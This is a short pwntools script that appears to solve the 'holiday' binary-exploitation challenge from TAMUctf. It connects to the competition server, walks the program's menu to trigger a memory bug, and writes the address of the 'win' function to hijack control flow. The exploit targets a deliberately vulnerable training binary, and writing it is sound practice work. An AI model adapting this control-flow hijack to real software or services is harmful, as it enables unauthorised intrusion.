#!/usr/bin/env python3

from pwn import *

exe = ELF("holiday")

context.binary = exe
context.terminal = "kitty"

CHAL = "holiday"

p = remote("tamuctf.com", 443, ssl=True, sni=CHAL)

p.sendline(b"1")
p.sendline(b"0")

p.sendline(b"2")
p.sendline(b"0")

p.sendline(b"3")
p.sendline(b"9")
p.send(p64(exe.symbols['win']))

p.sendline(b"2")
p.sendline(b"0")
# good luck pwning :)

p.interactive()
